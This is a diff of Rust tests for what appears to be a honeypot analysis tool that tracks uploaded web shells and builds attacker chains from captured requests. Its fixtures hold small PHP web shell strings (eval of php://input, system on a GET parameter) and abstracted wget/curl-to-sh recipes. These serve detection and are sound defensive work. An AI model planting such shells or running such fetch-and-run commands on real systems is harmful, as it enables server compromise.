+            for gone in ["PRIVATE", "BEGIN", "QUJDREVG", "LS0tLS1", "tool="] {
+                assert!(!text.contains(gone), "{gone}: {r:?}");
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn a_request_that_carried_an_upload_is_read_without_its_body() {
+        let (s, _d) = store().await;
+        let raw = b"<?php eval(file_get_contents('php://input')); echo 'padding'; ?>";
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", raw).await;
+        let second = seed_upload(&s, OTHER, "/up/a.php", raw).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        let carrier = uploads::get(&mut c, &second)
+            .await
+            .unwrap()
+            .unwrap()
+            .request_id;
+        drop(c);
+        sqlx::query("UPDATE requests SET body = 'UPLOADMARK' WHERE id = ?")
+            .bind(carrier)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        pieces_pass(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        assert!(
+            rows.iter().any(|r| r.label == "PUT /up/a[.]php"),
+            "{rows:?}"
+        );
+        assert!(!format!("{rows:?}").contains("UPLOADMARK"), "{rows:?}");
+    }
+
+    #[tokio::test]
+    async fn follow_ups_past_the_cap_are_counted_not_read() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", SHELL_GET).await;
+        for i in 0..FOLLOW_READS_MAX + 3 {
+            sent(&s, "/up/a.php", Some(&format!("tool=c{i}")), None).await;
+        }
+        pieces_pass(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        assert_eq!(rows.len(), FOLLOW_READS_MAX + 1, "{rows:?}");
+        let last = rows.last().unwrap();
+        assert_eq!(last.label, "3 more requests");
+        assert_eq!(last.href, Some(format!("/admin/traps/uploads/{uid}")));
+    }
+
+    #[tokio::test]
+    async fn timelines_read_the_newest_uploads_only() {
+        let (s, _d) = store().await;
+        for i in 0..TIMELINE_UPLOADS + 2 {
+            let path = format!("/up/{i}.php");
+            seed_upload(&s, UPLOADER, &path, FILE).await;
+            sent(&s, &path, None, None).await;
+        }
+        let key = pass(&s).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        assert_eq!(
+            uploads_of(&mut c, &key).await.unwrap().len(),
+            TIMELINE_UPLOADS + 2
+        );
+        let rows = follow_ups(&mut c, &key).await.unwrap();
+        assert_eq!(rows.len(), TIMELINE_UPLOADS, "{rows:?}");
+        assert!(
+            rows.iter()
+                .all(|r| r.path != "/up/0.php" && r.path != "/up/1.php")
+        );
+    }
+
+    #[tokio::test]
+    async fn one_statement_reads_each_uploads_timeline() {
+        let (s, _d) = store().await;
+        let noisy = seed_upload(&s, UPLOADER, "/noisy.php", FILE).await;
+        let quiet = seed_upload(&s, UPLOADER, "/quiet.php", FILE).await;
+        for _ in 0..4 {
+            sent(&s, "/noisy.php", None, None).await;
+        }
+        let last = sent(&s, "/quiet.php", None, None).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        let rows = [
+            uploads::get(&mut c, &noisy).await.unwrap().unwrap(),
+            uploads::get(&mut c, &quiet).await.unwrap().unwrap(),
+        ];
+        let all = uploads::timelines(&mut c, &rows).await.unwrap();
+        assert!(all.iter().any(|r| r.id == last));
+        assert!(
+            all.windows(2)
+                .all(|w| (&w[0].ts, w[0].id) <= (&w[1].ts, w[1].id))
+        );
+        let one = uploads::timeline(&mut c, &rows[1]).await.unwrap();
+        assert_eq!(one.iter().map(|r| r.id).collect::<Vec<_>>(), [last]);
+    }
+
+    #[tokio::test]
+    async fn pieces_past_the_cap_are_counted_and_joiners_stay() {
+        let (s, _d) = store().await;
+        let (id, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
+        for i in 0..FOUND_MAX + 5 {
+            let value = format!("recipe-{i}");
+            sight(&s, ("recipe", &value, "recipe"), ("request", id), ip).await;
+        }
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Ip(ip)).await.unwrap();
+        let c = &chains[0];
+        assert_eq!(c.more, 6);
+        assert_eq!(stage(c, "Command").len(), FOUND_MAX - 1);
+        assert_eq!(one(c, "Delivery").label, "a[.]example[.]org");
+        // The same bound without a key.
+        let hash = piece_hash("recipe", "recipe-0");
+        let chains = s.chains_of(Anchor::Piece(hash)).await.unwrap();
+        let c = &chains[0];
+        assert_eq!(c.key, None);
+        assert_eq!(c.more, 6);
+        assert_eq!(one(c, "Delivery").label, "a[.]example[.]org");
+    }
+
+    #[tokio::test]
+    async fn a_lookup_by_piece_uses_the_index() {
+        let (s, _d) = store().await;
+        let plan: Vec<(i64, i64, i64, String)> =
+            sqlx::query_as("EXPLAIN QUERY PLAN SELECT chain FROM chain_pieces WHERE piece = 1")
+                .fetch_all(&s.pool)
+                .await
+                .unwrap();
+        assert!(plan[0].3.contains("idx_chain_pieces_piece"), "{plan:?}");
+    }
+
+    #[test]
+    fn inputs_come_from_every_profile_of_the_shell() {
+        let found = [
+            "input=$_GET[a],$_POST[b];exec=system;marker=x",
+            "input=php://input;exec=eval",
+        ];
+        assert_eq!(
+            shell_inputs(found.into_iter()),
+            ["$_GET[a]", "$_POST[b]", "php://input"]
+        );
+    }
+
+    #[test]
+    fn a_recipe_label_keeps_both_branches() {
+        for (normal, want) in [
+            (
+                "try[ try[ prepare(cd) ] else [ prepare(cd) ] ] else [ prepare(cd) ] → write → \
+                 prepare(chmod) → try[ fetch(scp <url>) → arm → run(<file> <tag>) ] else \
+                 [ try[ fetch(wget <url>) ] else [ fetch(curl <url>) ] | run(sh <tag>) ] → cleanup",
+                "scp → run → else wget || curl → sh",
+            ),
+            (
+                "try[ fetch(wget <url>) ] else [ fetch(curl <url>) ] | run(sh <tag>)",
+                "wget || curl → sh",
+            ),
+            (
+                "try[ fetch(nc <url>) ] else [ other(socat) ] | run(sh)",
+                "nc || socat → sh",
+            ),
+            (
+                "prepare(cd) → try[ fetch(wget <url>) ] else [ fetch(curl <url>) ] → arm → run(<file>)",
+                "wget || curl → run",
+            ),
+            (
+                "try[ try[ fetch(wget <url>) ] else [ fetch(wget <url>) ] ] else [ fetch(curl <url>) ]",
+                "wget || curl",
+            ),
+            // Something after the `else`: it is clear where that ends.
+            (
+                "try[ fetch(scp <url>) → run(sh) ] else [ fetch(curl <url>) → run(bash) ] → other(ls)",
+                "(scp → sh → else curl → bash) → ls",
+            ),
+            // Only readying: nothing to shorten.
+            ("prepare(cd) → write", "prepare(cd) → write"),
+            // Cut at the piece limit.
+            ("try[ fetch(wget <url>) ] else [ try[ fetch(cu", "wget"),
+            ("try[ fetch(wget <url>) ] else [", "wget"),
+            // No form the parser writes: it stays as it is, and nothing breaks.
+            (
+                "] ] else [ try[ fetch(curl <url>) ",
+                "] ] else [ try[ fetch(curl <url>) ",
+            ),
+        ] {
+            assert_eq!(compact_recipe(normal), want, "{normal}");
+        }
+    }
+
+    #[test]
+    fn a_long_recipe_label_shows_its_fallback() {
+        let mut normal = "prepare(cd) → ".repeat(30);
+        normal += "try[ fetch(scp <url>) ] else [ fetch(wget <url>) ] | run(sh)";
+        assert!(label(&normal).ends_with('…'));
+        let found = Found {
+            hash: 1,
+            kind: "recipe".into(),
+            value: normal,
+            role: "recipe".into(),
+            seen: false,
+            ips: 1,
+            sources: 1,
+        };
+        let rows = command_rows(&[found], &Here::default());
+        assert_eq!(rows[0].label, "scp || wget → sh");
+    }
+
+    /// One chain, two shells: each reads only its own field, and a request
+    /// holding both fields shows what the shell it reached reads.
+    #[tokio::test]
+    async fn a_follow_up_reads_the_inputs_of_its_own_shell() {
+        let (s, _d) = store().await;
+        let one = b"<?php system($_GET['c']); echo 'a shell of 32 bytes or so'; ?>";
+        let two = b"<?php system($_GET['d']); echo 'b shell of 32 bytes or so'; ?>";
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", one).await;
+        seed_upload(&s, UPLOADER, "/up/b.php", two).await;
+        seed_upload(&s, OTHER, "/up/a.php", one).await;
+        seed_upload(&s, OTHER, "/up/b.php", two).await;
+        sent(&s, "/up/a.php", Some("d=whoami&c=id"), None).await;
+        sent(&s, "/up/b.php", Some("c=id&d=whoami"), None).await;
+        extract(&s.pool).await.unwrap();
+        // Joiners connect through a source naming both, from two addresses.
+        let files: Vec<String> = sqlx::query_scalar("SELECT value FROM pieces WHERE kind = 'file'")
+            .fetch_all(&s.pool)
+            .await
+            .unwrap();
+        assert_eq!(files.len(), 2);
+        let both = files.iter().map(|f| ("file", f.as_str(), "file"));
+        let both: Vec<_> = both.collect();
+        sighted(&s, UPLOADER, "/both", &both).await;
+        sighted(&s, OTHER, "/both", &both).await;
+        run(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        let by_path = |path: &str| {
+            rows.iter()
+                .find(|r| r.mark == Mark::Seen && r.detail.contains(path))
+                .map(|r| r.label.as_str())
+        };
+        assert_eq!(by_path("/up/a[.]php"), Some("id"), "{rows:?}");
+        assert_eq!(by_path("/up/b[.]php"), Some("whoami"), "{rows:?}");
+    }
+
+    /// `pieces.sources` is 3 here, and each chain holds its own share.
+    #[tokio::test]
+    async fn a_row_counts_the_requests_of_its_own_chain() {
+        let (s, _d) = store().await;
+        const SHARED: (&str, &str, &str) = ("recipe", "fetch(curl <url>) | run(sh)", "recipe");
+        let other_stager = ("stager", "203.0.113.200", "stager");
+        for (i, ip) in [UPLOADER, OTHER].into_iter().enumerate() {
+            sighted(&s, ip, &format!("/a{i}"), &[STAGER_A, SHARED]).await;
+        }
+        for ip in ["192.0.2.71", "192.0.2.72"] {
+            sighted(&s, ip, "/b", &[other_stager]).await;
+        }
+        sighted(&s, "192.0.2.72", "/c", &[other_stager, SHARED]).await;
+        run(&s).await;
+        let hash = piece_hash("recipe", SHARED.1);
+        let global: i64 =
+            sqlx::query_scalar("SELECT COUNT(*) FROM piece_sightings WHERE piece = ?")
+                .bind(hash)
+                .fetch_one(&s.pool)
+                .await
+                .unwrap();
+        assert_eq!(global, 3);
+        let requests = |stager: (&'static str, &'static str, &'static str)| {
+            let key = key_of(piece_hash(stager.0, stager.1));
+            let s = &s;
+            async move {
+                let c = s.chain_by_key(&key).await.unwrap().unwrap();
+                one(&c, "Command").requests
+            }
+        };
+        assert_eq!(requests(STAGER_A).await, 2);
+        assert_eq!(requests(other_stager).await, 1);
+    }
+
+    #[tokio::test]
+    async fn a_chain_without_a_key_counts_its_own_sources() {
+        let (s, _d) = store().await;
+        let (id, _) = sighted(&s, UPLOADER, "/a", &[RECIPE]).await;
+        sighted(&s, OTHER, "/b", &[RECIPE]).await;
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        assert_eq!(one(&chains[0], "Command").requests, 1);
+    }
+
+    #[tokio::test]
+    async fn stages_a_source_did_not_use_are_dimmed() {
+        let (s, _d) = store().await;
+        sighted(&s, OTHER, "/b", &[STAGER_A, RECIPE]).await;
+        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A, EXPLOIT_A]).await;
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        assert!(!one(&chains[0], "Exploit").dim);
+        assert!(one(&chains[0], "Exploit").here);
+        assert!(one(&chains[0], "Delivery").here);
+        // Another source's recipe still shows, dimmed.
+        let recipe = one(&chains[0], "Command");
+        assert!(recipe.dim && !recipe.here, "{recipe:?}");
+        assert!(one(&chains[0], "Payload").dim);
+        // Other anchors dim nothing.
+        let (_, ip) = sighted(&s, UPLOADER, "/c", &[]).await;
+        let chains = s.chains_of(Anchor::Ip(ip)).await.unwrap();
+        assert!(
+            chains[0]
+                .stages
+                .iter()
+                .all(|s| s.rows.iter().all(|r| !r.dim))
+        );
+        assert!(one(&chains[0], "Exploit").here, "what this address sent");
+        assert!(!one(&chains[0], "Command").here);
+    }
+
+    #[tokio::test]
+    async fn queried_urls_never_appear_in_a_strip() {
+        let (s, _d) = store().await;
+        let queried = ("stager", "metadata.example.org", "queried");
+        let hosted = ("stager", "203.0.113.5", "self-hosted");
+        let (only, _) = sighted(&s, UPLOADER, "/q", &[queried, hosted]).await;
+        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A, queried]).await;
+        run(&s).await;
+        assert!(s.chains_of(Anchor::Request(only)).await.unwrap().is_empty());
+        let queried_piece = piece_hash(queried.0, queried.1);
+        assert!(
+            s.chains_of(Anchor::Piece(queried_piece))
+                .await
+                .unwrap()
+                .is_empty()
+        );
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        assert_eq!(one(&chains[0], "Delivery").label, "a[.]example[.]org");
+    }
+
+    #[tokio::test]
+    async fn a_forged_name_stays_out_of_the_other_chain() {
+        let (s, _d) = store().await;
+        // One body names both; they stay two chains.
+        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A, STAGER_B]).await;
+        sighted(&s, OTHER, "/b", &[STAGER_A]).await;
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        assert_eq!(chains.len(), 2);
+        for c in &chains {
+            assert_eq!(stage(c, "Delivery").len(), 1, "{c:?}");
+        }
+    }
+
+    #[tokio::test]
+    async fn joinerless_request_gets_its_own_chain_and_a_link_to_the_addresses_chains() {
+        let (s, _d) = store().await;
+        let (_, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
+        let (id, _) = sighted(&s, UPLOADER, "/b", &[RECIPE, EXPLOIT_A, TAG]).await;
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        assert_eq!(chains.len(), 1);
+        let c = &chains[0];
+        assert_eq!(c.key, None);
+        assert_eq!((c.ips, c.sources), (1, 1));
+        assert_eq!(one(c, "Exploit").label, "cve_2024_4577");
+        assert!(one(c, "Exploit").detail.contains("POST /hello[.]world"));
+        assert!(one(c, "Command").here);
+        assert!(stage(c, "Delivery").is_empty());
+        assert_eq!(c.title(), "no joiner");
+        // The address's chains are the link.
+        let of_address = s.chains_of(Anchor::Ip(ip)).await.unwrap();
+        assert_eq!(of_address.len(), 1);
+        assert!(of_address[0].key.is_some());
+        assert_eq!(of_address[0].title(), "a[.]example[.]org");
+        assert_eq!(
+            of_address[0].href(),
+            Some("/admin/evidence/links/stager/a.example.org")
+        );
+    }
+
+    #[tokio::test]
+    async fn a_request_before_the_next_pass_has_a_chain_of_its_own() {
+        let (s, _d) = store().await;
+        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        assert_eq!(chains[0].key, None);
+        assert_eq!(one(&chains[0], "Delivery").label, "a[.]example[.]org");
+        assert!(!one(&chains[0], "Delivery").joiner, "it ties nothing yet");
+    }
+
+    #[tokio::test]
+    async fn a_describer_reads_as_the_sources_sharing_it() {
+        let (s, _d) = store().await;
+        sighted(&s, UPLOADER, "/a", &[RECIPE, EXPLOIT_A]).await;
+        sighted(&s, OTHER, "/b", &[RECIPE, EXPLOIT_B, STAGER_A]).await;
+        run(&s).await;
+        let hash = piece_hash(RECIPE.0, RECIPE.1);
+        let chains = s.chains_of(Anchor::Piece(hash)).await.unwrap();
+        assert_eq!(chains.len(), 1);
+        let c = &chains[0];
+        assert_eq!(c.key, None);
+        assert_eq!((c.ips, c.sources), (2, 2));
+        assert_eq!(stage(c, "Exploit").len(), 2);
+        assert!(one(c, "Command").here);
+        assert!(!one(c, "Delivery").joiner, "sharing a recipe joins nothing");
+        assert_eq!(c.first_seen, T0);
+    }
+
+    #[tokio::test]
+    async fn the_mark_follows_the_stored_grade() {
+        let (s, _d) = store().await;
+        let (id, _) = sighted(&s, UPLOADER, "/a", &[STAGER_A, EXPLOIT_A]).await;
+        seen(piece_hash(EXPLOIT_A.0, EXPLOIT_A.1))
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Request(id)).await.unwrap();
+        assert_eq!(one(&chains[0], "Delivery").mark, Mark::Claimed);
+        assert_eq!(one(&chains[0], "Exploit").mark, Mark::Seen);
+    }
+
+    #[tokio::test]
+    async fn a_chain_with_nothing_left_is_not_built() {
+        let (s, _d) = store().await;
+        let (_, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
+        run(&s).await;
+        campaign(&s, UPLOADER, &[ip]).await;
+        // A deleted row took the sighting; the chain row waits for the pass.
+        sqlx::query("DELETE FROM piece_sightings")
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        assert!(
+            s.chains_of(Anchor::Campaign(UPLOADER))
+                .await
+                .unwrap()
+                .is_empty()
+        );
+        assert!(s.chains_of(Anchor::Ip(ip)).await.unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn chains_come_newest_first_and_stop_at_the_cap() {
+        let (s, _d) = store().await;
+        let ip_id = s.upsert_ip(UPLOADER.parse().unwrap()).await.unwrap().id;
+        let mut hashes = vec![];
+        for i in 0..4 {
+            let value = format!("{i}.example.org");
+            let h = sight(&s, ("stager", &value, "stager"), ("request", i), ip_id).await;
+            let ts = format!("2026-10-0{} 00:00:00", i + 1);
+            sqlx::query("UPDATE piece_sightings SET ts = ? WHERE piece = ?")
+                .bind(ts)
+                .bind(h)
+                .execute(&s.pool)
+                .await
+                .unwrap();
+            hashes.push(h);
+        }
+        run(&s).await;
+        let keys: Vec<_> = s.chains_upto(Anchor::Ip(ip_id), 2).await.unwrap();
+        let keys: Vec<_> = keys.into_iter().map(|c| c.key.unwrap()).collect();
+        assert_eq!(keys, [key_of(hashes[3]), key_of(hashes[2])]);
+        let page = s
+            .chains_page(
+                1,
+                ChainFilter {
+                    ip: Some(ip_id),
+                    ..Default::default()
+                },
+            )
+            .await
+            .unwrap();
+        assert_eq!(page.items.len(), 4);
+        assert_eq!(page.items[0].key, key_of(hashes[3]));
+        assert_eq!(page.items[0].payload, Mark::Gap);
+        let other = ChainFilter {
+            ip: Some(ip_id + 1),
+            ..Default::default()
+        };
+        assert!(s.chains_page(1, other).await.unwrap().items.is_empty());
+    }
+
+    #[tokio::test]
+    async fn a_put_has_the_name_of_its_path() {
+        let (s, _d) = store().await;
+        seed_upload(&s, UPLOADER, "/up/put.php", FILE).await;
+        sqlx::query("UPDATE uploads SET filename = NULL, ts = ?")
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        let at_30 = "2026-10-01 00:00:30";
+        let hit = request(&s, UPLOADER, ("GET", "/x/put.php"), 404, "default", at_30).await;
+        let key = pass(&s).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        assert_eq!(ids(dead_ends(&mut c, &key).await.unwrap()), [hit]);
+    }
+
+    #[tokio::test]
+    async fn dead_ends_group_by_path() {
+        let (s, _d) = store().await;
+        seed_upload(&s, UPLOADER, "/up/s.php", FILE).await;
+        sqlx::query("UPDATE uploads SET ts = ?")
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        let at = |n: u32| format!("2026-10-01 00:00:{n:02}");
+        let get = |p| ("GET", p);
+        request(&s, UPLOADER, get("/a/s.php"), 404, "default", &at(5)).await;
+        request(&s, UPLOADER, get("/a/s.php"), 404, "default", &at(9)).await;
+        request(&s, UPLOADER, get("/b/s.php"), 404, "default", &at(20)).await;
+        // Not a dead end: found, or another name.
+        request(&s, UPLOADER, get("/c/s.php"), 200, "default", &at(6)).await;
+        request(&s, UPLOADER, get("/c/t.php"), 404, "default", &at(6)).await;
+        let got = s.dead_ends_all(10).await.unwrap();
+        let paths: Vec<_> = got.iter().map(|d| (d.path.as_str(), d.hits)).collect();
+        assert_eq!(paths, [("/b/s.php", 1), ("/a/s.php", 2)]);
+        assert_eq!(got[1].last_seen, at(9));
+        assert_eq!(s.dead_ends_all(1).await.unwrap().len(), 1);
+    }
+}
